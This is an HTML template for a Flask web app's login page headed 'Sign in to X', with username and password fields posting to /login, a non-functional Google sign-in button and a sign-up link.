<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="card">
        <div class="logo">
            <span class="logo-x">X</span>
        </div>
        <h2>Sign in to X</h2>
        <div class="subtitle">Enter your credentials to continue</div>
        <form id="loginForm" action="/login" method="post" autocomplete="off">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Log in</button>
            <div class="error" id="errorMsg">Please fill in all fields.</div>
        </form>
        <div class="divider">or</div>
        <button style="background:#222; color:#fff; border:1px solid #333; margin-bottom:0;">Sign in with Google</button>
        <div class="bottom-link">
            Don't have an account?
            <a href="/register" style="margin-left: 0.5em;">Sign up</a>
        </div>
    </div>
    <script src="{{ url_for('static', filename='form.js') }}"></script>
</body>
</html>
